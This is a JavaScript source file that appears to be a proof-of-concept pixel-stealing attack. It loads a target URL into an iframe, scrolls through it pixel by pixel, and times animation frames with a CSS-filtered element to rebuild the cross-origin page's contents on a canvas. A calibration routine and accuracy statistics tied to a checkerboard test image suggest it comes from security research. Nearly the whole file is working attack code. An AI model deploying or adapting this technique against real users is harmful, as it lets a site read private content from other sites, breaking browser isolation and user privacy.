var haltFlag;

var size;

function debug(text) {
//  document.getElementById("debug").innerHTML += text.replace("\n", "<br/>\n");
}

function status(text) {
  document.getElementById("status").innerHTML = text.replace("\n", "<br/>\n");
}

function run() {

    console.log("Starting attack\n");

    // Set the target iframe and the reference iframe to the target URL
    var frame = document.getElementById("frame");
    var framemirror = document.getElementById("framemirror");
    frame.src = document.getElementById("url").value;
    framemirror.src = document.getElementById("url").value;

    // Wait until the target frame finishes loading
    size = document.getElementById("size").value;
    status("Loading target...\n");
    frame.onload = function() { frame.onload = null; init(size); }
}

function halt() {
  haltFlag = true;
}

var ctx;

function init(sz) {
    size = sz;
  document.getElementById("debug").innerHTML = "";

  var canvas = document.getElementById("canvas");
  ctx = canvas.getContext("2d");

    status("Finding threshold\n");
  findThresholdBetter(sz);
}
function runAttack(midpt) {
    status("Running reconstruction\n");
    var white_errors = 0;
    var black_errors = 0;

    debug("size: " + size + "\n");
    debug("midpt: " + midpt + "\n");

    var i = 0, width = 48, height = 48;
    var scroll = document.getElementById("scroll");
    var pixel = document.getElementById("pixel");

    ctx.fillStyle = "#808080";
    ctx.fillRect(0, 0, width, height);

    var exec = function(xp,yp) {
      if(haltFlag) { return; }
      var x = xp;
      var y = yp;


      scroll.scrollLeft = x;
      scroll.scrollTop = y;

      pixel.className = "pixel";

      getTiming(function(result) {
        if(result < midpt) {
            ctx.fillStyle = "#ffffff";
	        black_errors += checkError(0,x,y);
        } else {
            ctx.fillStyle = "#000000";
	        white_errors += checkError(1,x,y);
        }
      ctx.fillRect(x, y, 1, 1);
      x = x+1
      if(x >= width){
          x = 0;
          y = y+1;
      }
      if(y >= height){
        var d = new Date();
	  debug("Stop Time " + d.getTime()+"\n");
	    status("Done!\n");
	    console.log("48x48 px checkerboard stats, only meaningful on that test image\n");
	    console.log("White errors: "+white_errors+" ("+(white_errors/(8*12*12))*100.0+"% )\n");
	    console.log("Black errors: "+black_errors+" ("+(black_errors/(8*12*12))*100.0+"% )\n");
	    console.log("Accuracy: "+(1-((black_errors+white_errors)/(48*48)))*100.0+"%\n");
        return;
      }



        exec(x,y);
      });
    };
    var d = new Date();
    debug("Starting at " + d.getTime()+"\n");
    exec(0,0);
    
}

//This is manually defined for the testing image
function checkError(color,x,y) {
    if ((Math.floor(x/12)+Math.floor(y/12))%2 == color){
	return 0;
    }
    return 1;
}

var bresult = [];
var wresult = [];
var bchecks = 5;
var wchecks = 5;

var pixel = document.getElementById("pixel");

function findThresholdBetter(size) {
    bresult = [];
    wresult = [];
    bchecks = 10;
    wchecks = 10;

    pixel = document.getElementById("pixel");
    pixel.style.width = size + "px";
    pixel.style.height = size + "px";

    pixel.className = "black";
    pixel.classList.add("threshold");
    getTimingBetter();
}

function getTimingBetter(){
  var pixel = document.getElementById("pixel");
    pixel.classList.add("timing");
    var hrt_st = performance.now();
    requestAnimationFrame(function(startTime) {
        var hrt_end = performance.now();
        pixel.classList.remove("timing");
        requestAnimationFrame(function(endTime) {
            if((hrt_end - hrt_st) < 12) {
                getTimingBetter();
            } else {
                delta = hrt_end - hrt_st;
                if(pixel.className == "black"){
                    bchecks--;
                    bresult.push(delta);
                    pixel.className = "white";
                    getTimingBetter();
                }
                else{
                    wchecks--;
                    wresult.push(delta);
                    pixel.className = "black";
                    if(wchecks != 0){
                        getTimingBetter();
                    }
                    else{
			bavg = bresult.reduce(function(a, b) { return a + b; })/bresult.length;
			wavg = wresult.reduce(function(a, b) { return a + b; })/wresult.length;
			debug("Black: Avg:"+bavg+" ::"+bresult+"\n");
			debug("White: Avg:"+wavg+" ::"+wresult+"\n");
                        runAttack((bavg+wavg)/2);
                    }
                }
            }
        });
    });
}

function getTiming(done) {
  var pixel = document.getElementById("pixel");
    pixel.classList.add("timing");
    var hrt_st = performance.now();
    requestAnimationFrame(function(startTime) {
    var hrt_end = performance.now();
      pixel.classList.remove("timing");
      requestAnimationFrame(function(endTime) {
        if((hrt_end - hrt_st) < 12) {
          getTiming(done);
          //done(endTime - startTime);
        } else {
          done(hrt_end - hrt_st);
        }
      });
  });
}

function isNear(left, right) {
  return (left < (right * 1.3)) && (right < (left * 1.3));
}

